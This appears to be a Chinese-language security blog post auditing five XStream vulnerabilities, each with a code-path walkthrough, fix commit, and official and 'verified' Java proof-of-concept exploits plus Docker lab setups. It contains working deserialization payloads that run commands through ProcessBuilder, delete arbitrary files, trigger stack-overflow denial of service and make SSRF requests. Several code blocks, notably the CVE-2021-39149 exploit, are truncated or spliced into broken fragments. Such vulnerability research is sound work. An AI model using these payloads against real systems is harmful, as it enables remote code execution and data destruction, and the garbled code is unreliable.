<h2 id="cve-2024-47072-栈溢出dos">CVE-2024-47072 栈溢出DOS</h2>
<h4 id="i-审计过程">i. 审计过程</h4>
<p>首先了解Token，这是Xstream自己定义的黑话<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260301160424836.png" alt="image.png" loading="lazy"></p>
<ul>
<li><strong><code>TYPE_START_NODE = 3</code></strong>：开始标签。相当于 XML 里的 <code>&lt;name&gt;</code>。</li>
<li><strong><code>TYPE_END_NODE = 4</code></strong>：结束标签。相当于 XML 里的 <code>&lt;/name&gt;</code>。</li>
<li><strong><code>TYPE_ATTRIBUTE = 5</code></strong>：属性。相当于 XML 里的 <code>id="123"</code>。</li>
<li><strong><code>TYPE_VALUE = 6</code></strong>：文本值。相当于标签里的具体内容，比如 <code>test_user</code>。</li>
<li><strong><code>TYPE_MAP_ID_TO_VALUE = 2</code></strong>：存字典指令，告诉程序先记下一个 ID 和字符串的对应关系，方便后面简写。</li>
</ul>
<p>问题出在readToken()函数里被选中的两行中，<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260228173343076.png" alt="image.png" loading="lazy"><br>
当token为2的时候程序默认要存入一个字典，进入分支之后开始取ID取value<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260301160833827.png" alt="image.png" loading="lazy"><br>
当攻击者传入如下数据时，10为2+8得来，2代表要存入字典、8代表ID占一个字节、-127为随意取值，0,0代表存入的内容是空的。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260301161322971.png" alt="image.png" loading="lazy"><br>
当程序执行完存入字典的流程后，函数继续调用自身<code>return this.readToken();</code> 但上一个流程还没关闭，也就导致了无限递归。</p>
<h4 id="ii-commit-diff">ii. Commit Diff</h4>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260228173003023.png" alt="image.png" loading="lazy"><br>
开发者修复方式是在此处添加了一个do While循环，利用 continue解决了递归问题，同时在下面添加了<code>mapping = !mapping;</code>的翻转，规避掉了连续两次存入字典的情况。</p>
<h4 id="iii-poc">iii. POC</h4>
<h6 id="官方poc">官方POC</h6>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260301153417634.png" alt="image.png" loading="lazy"></p>
<h6 id="已验证poc">已验证POC</h6>
<pre><code class="language-java">package org.example;  
  
import com.thoughtworks.xstream.XStream;  
import com.thoughtworks.xstream.io.binary.BinaryStreamDriver;  
import java.io.ByteArrayInputStream;  
  
public class Exploit {  
    public static void main(String[] args) {  
        System.out.println("[*] 正在构造恶意二进制流...");  
  
        // 构造特定的字节数组，诱导 BinaryStreamDriver 进入无限递归  
        final byte[] byteArray = new byte[40000];  
        for (int i = 0; i &lt; byteArray.length / 4; i++) {  
            byteArray[i * 4] = 10;  
            byteArray[i * 4 + 1] = -127;
            byteArray[i * 4 + 2] = 0;  
            byteArray[i * 4 + 3] = 0;  
        }  
  
        try {
            XStream xstream = new XStream(new BinaryStreamDriver());  
  
            System.out.println("[*] 开始反序列化...");  
            xstream.fromXML(new ByteArrayInputStream(byteArray));  
  
        } catch (StackOverflowError e) {  
            System.err.println("\n[!] 成功触发漏洞");  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
</code></pre>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260228174810461.png" alt="image.png" loading="lazy"></p>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260228174855195.png" alt="image.png" loading="lazy"></p>

<h2 id="cve-2013-7285-反序列化">CVE-2013-7285 反序列化</h2>
<h4 id="i-审计过程-1">i. 审计过程</h4>
<p>根据POC逆推，这个洞可以看标签推出来。首先<code>sorted-set</code>可以在Xstream.java中看到<code>this.alias("sorted-set", SortedSet.class);</code>可知<code>sorted-set</code>对应<code>SortedSet</code><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303111605038.png" alt="image.png" loading="lazy"><br>
跟进可以看到这个<code>SortedSet</code>是个接口并无构造方法，于是找默认实现类<br>
在Xstream.java中的setupDefaultImplementations方法中可以看到<code>SortedSet</code>的默认实现类是<code>TreeSet</code>，于是跟进<code>TreeSet</code>(注意此处内存中就已经是一个TreeSet实例了)<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303112102858.png" alt="image.png" loading="lazy"><br>
发现这里也是接口，但没断掉，因为下面有个<code>this(new TreeMap&lt;&gt;())</code>，当Xstream检测到TreeMap已经被创建好了就回去使用<code>CollectionConverter.class</code>中的<code>populateCollection</code>函数解析XML标签。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303112312549.png" alt="image.png" loading="lazy"><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303113343695.png" alt="image.png" loading="lazy"><br>
看下调用堆栈<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303113444251.png" alt="image.png" loading="lazy"><br>
继续往下走发现走到了重载的方法里<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303113537178.png" alt="image.png" loading="lazy"></p>
<p>于是就又是<code>moveDown()</code>  <code>moveUp</code><br>
其中<code>moveDown()</code>是为了跳进XML下一层节点<br>
跟进<code>addCurrentElementToCollection</code><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303114146120.png" alt="image.png" loading="lazy"><br>
<code>target.add(item);</code>中的target就是之前new的那个TreeMap，而此处的item就是POC中的第二个节点，也就是动态代理<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303113823124.png" alt="image.png" loading="lazy"><br>
但是调试信息中显示item是touch，这就是一个问题所在。<br>
看一下调用堆栈<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303114627008.png" alt="image.png" loading="lazy"><br>
发现touch在最底下，在<code>target.add(item)</code>处打个断点就可以看到item变了<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303115107471.png" alt="image.png" loading="lazy"><br>
跟踪调试就能发现程序是通过<code>populateCollection</code>函数中的while去把栈里的元素挨个轮一遍，最后item归到的就是动态代理。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303115147920.png" alt="image.png" loading="lazy"><br>
当item归到动态代理之后，由于之前说过创建的是<code>TreeSet</code>实例，所以会跳到下图中的add方法，里面的e就是item，也就是刚才的动态代理<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303133207498.png" alt="image.png" loading="lazy"><br>
再跟进put方法<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303134132175.png" alt="image.png" loading="lazy"><br>
里面有compare，再跟会发现里面有compareTo<br>
这个时候问题就来了，compareTo里面的K就是动态代理，它向程序声明自己有compareTo方法，但实际上它将程序动态代理至<code>EventHandler</code>，而<code>EventHandler</code>本身不会在意动态代理转过来的参数，它只在乎自己收到了invoke请求，然后去执行攻击者所写的代码：<code>ProcessBuilder.start()</code>。这就是完整的链子。</p>
<h4 id="ii-commit-diff-1">ii. Commit Diff</h4>
<h5 id="第一步基础安全框架">第一步、基础安全框架</h5>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303142034732.png" alt="image.png" loading="lazy"><br>
虽然还是默认允许any但是用户和开发者可以通过<code>securityMapper</code>添加黑名单类<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303142132251.png" alt="image.png" loading="lazy"><br>
看一下<code>securityMapper</code>，貌似是白名单<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303142436375.png" alt="image.png" loading="lazy"><br>
但实际上在Xstream.java里面已经开完权限了，所以还是黑名单.<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303142735364.png" alt="image.png" loading="lazy"></p>
<h5 id="第二步拦截动态代理">第二步、拦截动态代理</h5>
<p>官方第二步的修复方法是把<code>java.beans.EventHandler</code>加了黑名单并且给开发者提供了<code>denyTypes</code>，例如调用<code>xstream.denyTypes(new String[]{"java.beans.EventHandler"})</code>时先允许any后封禁<code>EventHandler</code>。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303143528795.png" alt="image.png" loading="lazy"></p>
<p><a href="https://github.com/x-stream/xstream/commit/6344867dce6767af7d0fe34fb393271a6456672d" target="_blank" rel="noopener nofollow">https://github.com/x-stream/xstream/commit/6344867dce6767af7d0fe34fb393271a6456672d</a></p>
<h4 id="iii-poc-1">iii. POC</h4>
<h6 id="官方poc-1">官方POC</h6>
<pre><code class="language-java">&lt;contact class='dynamic-proxy'&gt;
  &lt;interface&gt;org.company.model.Contact&lt;/interface&gt;
  &lt;handler class='java.beans.EventHandler'&gt;
    &lt;target class='java.lang.ProcessBuilder'&gt;
      &lt;command&gt;
        &lt;string&gt;calc.exe&lt;/string&gt;
      &lt;/command&gt;
    &lt;/target&gt;
    &lt;action&gt;start&lt;/action&gt;
  &lt;/handler&gt;
&lt;/contact&gt;


XStream xstream = new XStream();
Contact contact = (Contact)xstream.fromXML(xml);
</code></pre>
<h6 id="已验证poc-1">已验证POC</h6>
<pre><code class="language-java">import com.thoughtworks.xstream.XStream;  
import com.thoughtworks.xstream.security.AnyTypePermission;  
import java.io.File;  
  
public class CVE_2013_7285_POC {  
    public static void main(String[] args) {  
        XStream xstream = new XStream();  
        xstream.addPermission(AnyTypePermission.ANY);  
        String xml = "&lt;sorted-set&gt;\n" +  
                "  &lt;dynamic-proxy&gt;\n" +  
                "    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n" +  
                "    &lt;handler class=\"java.beans.EventHandler\"&gt;\n" +  
                "      &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n" +  
                "        &lt;command&gt;\n" +  
                "          &lt;string&gt;touch&lt;/string&gt;\n" +  
                "          &lt;string&gt;/tmp/cve-2013-7285-pwned.txt&lt;/string&gt;\n" +  
                "        &lt;/command&gt;\n" +  
                "      &lt;/target&gt;\n" +  
                "      &lt;action&gt;start&lt;/action&gt;\n" +  
                "    &lt;/handler&gt;\n" +  
                "  &lt;/dynamic-proxy&gt;\n" +  
                "&lt;/sorted-set&gt;";  
  
        System.out.println("[*] 正在加载 CVE-2013-7285 Payload...");  
  
        try {  
            xstream.fromXML(xml);            System.out.println("[+] Payload 执行完成");  
        } catch (Exception e) {  
            System.err.println("[!] 异常信息: " + e.getMessage());  
        }  
        // 验证文件是否创建  
        File f = new File("/tmp/cve-2013-7285-pwned.txt");  
        if (f.exists()) {  
            System.out.println("[✓] 漏洞利用成功！文件已创建");  
        } else {  
            System.out.println("[✗] 漏洞利用失败，文件未创建");  
        }    }}
</code></pre>
<h4 id="iiii-漏洞环境-1">iiii. 漏洞环境</h4>

WORKDIR /app

CMD ["sh", "-c", "java -cp .:xstream.jar:xmlpull.jar:xpp3.jar CVE_2013_7285_POC"]
</code></pre>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260302211853263.png" alt="image.png" loading="lazy"></p>
<h2 id="cve-2021-39149-反序列化">CVE-2021-39149 反序列化</h2>
<h4 id="i-审计过程-2">i. 审计过程</h4>
<p>payload最外层节点变成了<code>linked-hash-set</code>，直接去Xstream.java里看吧<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303163957410.png" alt="image.png" loading="lazy"><br>
跟进发现是个接口类<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303164330058.png" alt="image.png" loading="lazy"><br>
于是往下跟父类，在父类中找到add()方法<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303164411621.png" alt="image.png" loading="lazy"><br>
再跟<code>put()</code>-&gt;<code>hash()</code>-&gt;<code>hashcode()</code>，这个点先按下不表<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303164423115.png" alt="image.png" loading="lazy"><br>
接着看POC子节点，<code>dynamic-proxy</code>依旧动态代理。声明自己有一个map方法，实际上当程序调用这个“map”之后走的是<code>CompositeInvocationHandlerImpl</code><br>
既然动态代理声明自己是<code>map</code>了程序就觉得你肯定有hashcode吧，什么原因看上文。<br>
转到<code>CompositeInvocationHandlerImpl</code>之后通过<code>invoke</code>方法直接触发危险类<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303170201518.png" alt="image.png" loading="lazy"><br>
这个invoke方法感觉问题还是很大，有空看看最新源码，感觉还是有问题。<br>
它的作用主要是查看当前被调用的方法是属于哪个类的，有没有对应handler处理，有的话交过去，没有的话走默认handler。<br>
攻击的大致链路就如下：</p>
<ul>
<li><code>HashMap</code> 调用 <code>proxy.hashCode()</code>。</li>
<li><code>hashCode</code> 方法属于 <code>java.lang.Object</code> 类。</li>
<li><code>CompositeInvocationHandlerImpl</code> 的 <code>invoke</code> 被触发，它去查自己的 Map。</li>
<li>它发现：针对 <code>Object</code> 类的方法（hashCode），有一个现成的 <code>DTraceProbe</code> 处理器。</li>
<li><code>DTraceProbe</code>能反射且参数可控(如下图)<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303170613623.png" alt="image.png" loading="lazy"></li>
</ul>
<h4 id="ii-commit-diff-2">ii. Commit Diff</h4>
<p>改成默认白名单了<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303171606365.png" alt="image.png" loading="lazy"><br>
<a href="https://github.com/x-stream/xstream/compare/XSTREAM_1_4_17...XSTREAM_1_4_18" target="_blank" rel="noopener nofollow">https://github.com/x-stream/xstream/compare/XSTREAM_1_4_17...XSTREAM_1_4_18</a></p>
<h4 id="iii-poc-2">iii. POC</h4>
<h6 id="官方poc-2">官方POC</h6>
<h6 id="已验证poc-2">已验证POC</h6>
<pre><code class="language-java">package org.example;  
  
import com.thoughtworks.xstream.XStream;  
import com.thoughtworks.xstream.security.AnyTypePermission;  
  
public class FinalExploit {  
    public static void main(String[] args) {  
        XStream xstream = new XStream();   
        xstream.addPermission(AnyTypePermission.ANY);  
  
String xml = "&lt;linked-hash-set&gt;\n" +  
                "  &lt;dynamic-proxy&gt;\n" +  
                "    &lt;interface&gt;map&lt;/interface&gt;\n" +  
                "    &lt;handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'&gt;\n" +  
                "      &lt;classToInvocationHandler class='linked-hash-map'/&gt;\n" +  
                "      &lt;defaultHandler class='sun.tracing.NullProvider'&gt;\n" +

                "&lt;boolean&gt;false&lt;/boolean&gt;                &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;\n" +  
                "              &lt;/proxy&gt;\n" +

        }  
    }  
}

<pre><code class="language-java">import com.thoughtworks.xstream.XStream;

public class FinalExploit {  
    public static void main(String[] args) {  
        XStream xstream = new XStream();  
        xstream.addPermission(AnyTypePermission.ANY);  
        // Linux创建文件的ProcessBuilder Payload  
        String xml = "&lt;linked-hash-set&gt;\n" +  
                "  &lt;dynamic-proxy&gt;\n" +  
                "    &lt;interface&gt;map&lt;/interface&gt;\n" +  
                "    &lt;handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'&gt;\n" +  
                "      &lt;classToInvocationHandler class='linked-hash-map'/&gt;\n" +  
                "      &lt;defaultHandler class='sun.tracing.NullProvider'&gt;\n" +  
                "        &lt;active&gt;true&lt;/active&gt;\n" +  
                "        &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;\n" +

            xstream.fromXML(xml);            System.out.println("[+] Payload 执行完成");  
        } catch (Exception e) {  
            System.err.println("[!] 异常信息: " + e.getMessage());  
            e.printStackTrace();        }  
        // 检查文件  
        File f = new File("/tmp/pwned.txt");  
        if (f.exists()) {  
            System.out.println("[✓] 漏洞利用成功！/tmp/pwned.txt 已创建");  
        } else {  
            System.out.println("[✗] 漏洞利用失败，文件未创建");  
        }    }}```

<h2 id="cve_2020_26259-任意文件删除">CVE_2020_26259 任意文件删除</h2>
<h4 id="i-审计过程-3">i. 审计过程</h4>
<p>这个漏洞的本质其实和好多反射致使RCE差不多，攻击者可以通过正常思路RCE，官方封RCE的类，然后攻击者利用其他非RCE的类攻击，例如SQL注入、文件创建、文件删除等等。<br>
简单跟一下吧<br>
跟到<code>putCurrentEntryIntoMap</code><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303151642765.png" alt="image.png" loading="lazy"><br>
进<code>put</code>后再进<code>hashcode</code>(此时的<code>getStringValue</code>中的<code>toString</code>&nbsp;函数，这个value是<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code>)<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303151745068.png" alt="image.png" loading="lazy"><br>
到<code>toString()</code>再跟<code>get()</code><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260303151827943.png" alt="image.png" loading="lazy"><br>
漏洞的正常思路是通过此处的<code>is.close();</code>去关闭文件的，下断点必须要在<code>try</code>里面下不然看不到进<code>try</code>的过程，因为下断点的话可以看到<code>this.data = null</code> <code>return</code>之后变成一堆0，但如果不在里面下断点的话程序会跳过直接return一堆0回来，看得我莫名其妙。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260304111409417.png" alt="image.png" loading="lazy"></p>
<h4 id="ii-commit-diff-3">ii. Commit Diff</h4>
<p>官方使用黑名单形式添加了<code>.*\\.ReadAllStream\\$FileStream</code>进行处理，治标不治本。<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260302140711391.png" alt="image.png" loading="lazy"></p>
<h4 id="iii-poc-3">iii. POC</h4>
<h5 id="官方poc-3">官方POC：</h5>
<pre><code class="language-java">    public void testCannotUseJaxwsInputStreamToDeleteFile() {
        if (JVM.isVersion(5)) {
            final String xml = ""
                + "&lt;is class='com.sun.xml.ws.util.ReadAllStream$FileStream'&gt;\n"
                + " &lt;tempFile&gt;target/junit/test.txt&lt;/tempFile&gt;\n"
                + "&lt;/is&gt;";

            xstream.aliasType("is", InputStream.class);
            try {
                xstream.fromXML(xml);
                fail("Thrown " + ConversionException.class.getName() + " expected");
            } catch (final ForbiddenClassException e) {
                // OK
            }
        }
    }

    public void testExplicitlyUseJaxwsInputStreamToDeleteFile() throws IOException {
        if (JVM.isVersion(5)) {
            final File testDir = new File("target/junit");
            final File testFile = new File(testDir, "test.txt");
            try {
                testDir.mkdirs();

                final OutputStream out = new FileOutputStream(testFile);
                out.write("JUnit".getBytes());
                out.flush();
                out.close();

                assertTrue("Test file " + testFile.getPath() + " does not exist.", testFile.exists());

                final String xml = ""
                    + "&lt;is class='com.sun.xml.ws.util.ReadAllStream$FileStream'&gt;\n"
                    + " &lt;tempFile&gt;target/junit/test.txt&lt;/tempFile&gt;\n"
                    + "&lt;/is&gt;";

                xstream.addPermission(AnyTypePermission.ANY); // clear out defaults
                xstream.aliasType("is", InputStream.class);

                InputStream is = null;
                try {
                    is = (InputStream)xstream.fromXML(xml);
                } catch (final ForbiddenClassException e) {
                    // OK
                }

                assertTrue("Test file " + testFile.getPath() + " no longer exists.", testFile.exists());

                byte[] data = new byte[10];
                is.read(data);
                is.close();

                assertFalse("Test file " + testFile.getPath() + " still exists exist.", testFile.exists());
            } finally {
                if (testFile.exists()) {
                    testFile.delete();
                }
                if (testDir.exists()) {
                    testDir.delete();
                }
            }
        }
    }
</code></pre>
<h5 id="已验证poc-3">已验证POC：</h5>
<pre><code class="language-java">package org.example;  
  
import com.thoughtworks.xstream.XStream;  
import com.thoughtworks.xstream.security.AnyTypePermission;  
import java.io.File;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
public class Exploit {  
    public static void main(String[] args) throws Exception {  

        String targetPath = System.getProperty("os.name").toLowerCase().contains("windows")  
                ? "victim.txt"  
                : "/tmp/victim.txt";  
  
        Files.write(Paths.get(targetPath), "Exploit Success".getBytes());  
        File f = new File(targetPath);  
        System.out.println("[*] Target file: " + f.getAbsolutePath() + " exists: " + f.exists());  
  
        XStream xstream = new XStream();  
        String xml_poc = "&lt;map&gt;\n" +  
                "  &lt;entry&gt;\n" +  
                "    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n" +  
                "      &lt;flags&gt;0&lt;/flags&gt;\n" +  
                "      &lt;value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'&gt;\n" +  
                "        &lt;dataHandler&gt;\n" +  
                "          &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;\n" +  
                "            &lt;contentType&gt;text/plain&lt;/contentType&gt;\n" +  
                "            &lt;is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'&gt;\n" +  
                "              &lt;tempFile&gt;" + f.getAbsolutePath() + "&lt;/tempFile&gt;\n" +  
                "            &lt;/is&gt;\n" +  
                "          &lt;/dataSource&gt;\n" +  
                "          &lt;transferFlavors/&gt;\n" +  
                "        &lt;/dataHandler&gt;\n" +  
                "        &lt;dataLen&gt;0&lt;/dataLen&gt;\n" +  
                "      &lt;/value&gt;\n" +  
                "    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n" +  
                "    &lt;string&gt;test&lt;/string&gt;\n" +  
                "  &lt;/entry&gt;\n" +  
                "&lt;/map&gt;";  
  
        System.out.println("[*] Triggering exploit via ReadAllStream$FileStream...");  
        try {  
            xstream.fromXML(xml_poc);  
        } catch (Exception e) {  
        }  
  
        System.gc();  
        System.runFinalization();  
        Thread.sleep(1000);  
  
        System.out.println("[*] Exploit Check:");  
        if (!f.exists()) {  
            System.out.println("\n[SUCCESS] CVE-2020-26259 Reproduced! File Deleted.");  
        } else {  
            System.out.println("\n[FAILED] File still exists. Try checking if ReadAllStream$FileStream exists in this JDK.");  
        }  
    }  
}
</code></pre>

<h2 id="cve-2020-26258-ssrf">CVE-2020-26258 SSRF</h2>
<h4 id="i-审计过程-4">i. 审计过程</h4>
<p>和任意文件删除一样都是基于CVE-2020-26257的漏洞，跟CVE-2020-26259也一样只不过一个是删文件的工具类一个是探测网络的工具类。<br>
前半段都是<code>putCurrentEntryIntoMap</code>、<code>hashCode()</code>、<code>toString()</code>、<code>Base64data()</code>、<code>get()</code>等等<br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260304100750548.png" alt="image.png" loading="lazy"></p>
<p>SSRF利用的就是<code>getInputStream</code><br>
<img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260304111312508.png" alt="image.png" loading="lazy"></p>
<h4 id="ii-commit-diff-4">ii. Commit Diff</h4>
<p><img src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260304114001688.png" alt="image.png" loading="lazy"></p>
<p>黑名单，应该是最后一波黑名单了。</p>
<h4 id="iii-poc-4">iii. POC</h4>
<h6 id="官方poc-4">官方POC</h6>
<pre><code class="language-java">&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class='javax.activation.URLDataSource'&gt;
            &lt;url&gt;http://localhost:8080/internal/:&lt;/url&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;string&gt;test&lt;/string&gt;
  &lt;/entry&gt;
&lt;/map&gt;

XStream xstream = new XStream();
xstream.fromXML(xml);

                "  &lt;entry&gt;\n" +

<h4 id="iiii-漏洞环境-4">iiii. 漏洞环境</h4>
<pre><code class="language-dockerfile">FROM maven:3.8.1-jdk-8  
  
WORKDIR /app  
  
RUN mkdir -p src/main/java/org/example  
  
RUN echo '&lt;project&gt;&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;&lt;groupId&gt;org.example&lt;/groupId&gt;&lt;artifactId&gt;demo&lt;/artifactId&gt;&lt;version&gt;1.0&lt;/version&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;&lt;artifactId&gt;xstream&lt;/artifactId&gt;&lt;version&gt;1.4.14&lt;/version&gt;&lt;/dependency&gt;&lt;/dependencies&gt;&lt;/project&gt;' &gt; pom.xml  
  

COPY CVE_2020_26258.java src/main/java/org/example/CVE_2020_26258.java  
  
RUN mvn compile  
  
CMD ["mvn", "exec:java", "-Dexec.mainClass=org.example.CVE_2020_26258"]
</code></pre>

    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
